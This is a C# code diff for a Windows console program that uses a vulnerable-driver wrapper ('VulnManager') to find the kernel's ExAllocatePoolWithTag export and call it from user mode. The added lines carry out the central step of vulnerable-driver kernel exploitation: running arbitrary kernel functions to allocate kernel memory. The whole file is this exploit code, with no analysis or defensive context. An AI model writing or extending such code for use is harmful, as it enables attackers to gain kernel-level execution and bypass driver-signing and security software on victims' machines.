@@ -5,19 +5,23 @@ class Program
 {
     static void Main(string[] args)
     {
-        using (var driver = VulnManager.EasyCreate())
+        using (var vuln = VulnManager.EasyCreate())
         {
-            if (driver == null)
+            if (vuln == null)
             {
                 Console.WriteLine("Failed to load driver");
                 return;
             }
 
             var baseAddr = VulnManager.GetKernelModuleAddress("ntoskrnl.exe");
-            Console.WriteLine("base: 0x" + baseAddr.ToString("X"));
+            var exportAddr = vuln.GetKernelModuleExport(baseAddr, "ExAllocatePoolWithTag");
 
-            var exportAddr = driver.GetKernelModuleExport(baseAddr, "ExAllocatePoolWithTag");
-            Console.WriteLine("export: 0x" + exportAddr.ToString("X"));
+            Console.WriteLine("ExAllocatePoolWithTag exportAddr: " + exportAddr);
+
+            ulong ret = 0;
+            vuln.CallKernelFunction(exportAddr, out ret, 0, 0x1000, 0xDEAD);
+
+            Console.WriteLine("ExAllocatePoolWithTag ret: " + ret.ToString("X"));
         }
     }
 }
